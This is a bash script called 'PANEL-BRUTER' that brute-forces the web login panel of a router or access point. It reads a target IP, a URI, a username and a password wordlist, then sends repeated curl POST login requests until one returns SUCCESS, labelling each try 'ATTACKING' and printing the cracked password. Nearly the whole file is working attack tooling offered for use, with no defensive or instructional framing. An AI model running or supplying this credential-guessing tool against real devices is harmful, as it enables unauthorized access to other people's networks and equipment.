#!/bin/bash
# MADE BY WickedW0LF

# COLORS

white="\033[1;37m"
light_grey="\033[0;37m"
grey="\033[49;90m"
light_red="\033[1;31m"
red="\033[0;31m"
on_green="\033[0;30m \033[42m"
light_green="\033[1;32m"
green="\033[0;32m"
light_blue="\033[1;34m"
blue="\033[0;34m"
error="\033[5;37m\033[7;31m"
nc="\e[0m"



# BANNER

clear
echo -e ""$light_grey""
echo -e ""$light_grey"██████╗  █████╗ ███╗   ██╗███████╗██╗           ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗$nc"
echo -e ""$light_grey"██╔══██╗██╔══██╗████╗  ██║██╔════╝██║           ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗$nc"
echo -e ""$light_grey"██████╔╝███████║██╔██╗ ██║█████╗  ██║    "$light_red"█████╗$nc "$light_grey"██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝$nc"
echo -e ""$light_grey"██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██║    "$light_red"╚════╝$nc "$light_grey"██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗$nc"
echo -e ""$light_grey"██║     ██║  ██║██║ ╚████║███████╗███████╗      "$light_grey"██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║$nc"
echo -e ""$light_grey"╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝      "$light_grey"╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝$blue v1.0"
echo -e "$nc								"$light_blue"Author$light_red :$nc"$on_green"W1ckedW0LF\n\n"$nc"$light_green"



# SOME INPUTS

read -p " Enter the Targets IP	$(echo -e ""$light_red":$white  ")" ip
read -p "$(echo -e "$light_green") Enter the URI FILE	$(echo -e ""$light_red":$white  ")" uri
read -p "$(echo -e "$light_green") Enter your USERNAME	$(echo -e ""$light_red":$white  ")" name
read -p "$(echo -e "$light_green") Enter your PW-WORDLIST	$(echo -e ""$light_red":$white  ")" pass
echo -e "\n\n$(echo "			Starting at: "`date "+%G-%d.%m AT %H:%M"`)\n"



# SOME COMPATIBILITES

wget -q --spider http://google.com

  if [ ! $? -eq 0 ]; then
    echo -e " $error You are offline! $nc\n"
    exit 1
  fi

if ! dpkg -s curl >/dev/null 2>&1; then
    printf "$light_red Installing required package: "
    sudo apt-get install curl -y > /dev/null

  if [ $(dpkg -s curl | grep -o installed) = "installed" ]; then
     printf "$light_green Completed!"
     read -n 1 -s -r -p "$(echo -e "\n\n$light_blue") Press any key to Continue... "
     echo -e "\n\n"
  else
     printf "$error Error! "$nc"\n\n"
     exit 1
  fi
fi
whole=`wc -l "$pass" | awk '{print $1}'`


# ACTION

count=0
while IFS= read -r passwds; do

  ((count=$count+1))


#
# Edit the request body content to one your access point is using while sending login request
#	Then just set up the variables init
#

login=`curl -s -d 'REPORT_METHOD=xml&ACTION=login_plaintext&USER='$name'&PASSWD='$passwds'&CAPTCHA' http://$ip/$uri | grep SUCCESS | sed -e 's/<[^>]*>//g' | tr -d "[:space:]"`



# IF THE LOG-IN SUCCESSFUL

if [ "SUCCESS" == "$login" ]; then
 sleep 0.7
   echo -e "\n$white			Completed at: $(date "+%G-%d.%m AT %H:%M"$nc)"
   echo -e "\n "$white"["$light_blue"STATUS"$white"]$white TARGET "$light_red":$light_grey $ip$green |$white USERNAME "$light_red":$light_grey $name$green |$white PASSWORD "$light_red":$light_grey $passwds$white = "$light_green"LOGIN SUCCESSED\n$nc"
   exit 0




# IF THE LOG-IN IS NOT SUCCESSFUL

elif [ ! "SUCCESS" == "$login" ]; then
 fail=`echo -e "$white ["$red"ATTACKING"$white"]$white TARGET "$light_red":$nc "$light_grey"$ip "$green"|$white USERNAME "$light_red":$nc "$light_grey"$name "$green"|$white PASSWORD "$light_red":$nc "$light_grey"$passwds$white = "$light_red"FAILED$nc"`

echo $fail $(printf "$green$count of $whole$nc")
 sleep 0.5



# JUST ELSE... PROBABLY NOT GONNA EVER SHOW IN THE OUTPUT

else
   echo -e "\n$white                       Completed at: $(date "+%G-%d.%m AT %H:%M"$nc)"
   echo -e "\n "$white"["$light_blue"STATUS"$white"]$white TARGET "$light_red":$light_grey $ip "$white"= "$red"FAILED TO LOGIN$nc"
   exit 1
fi
done < $pass
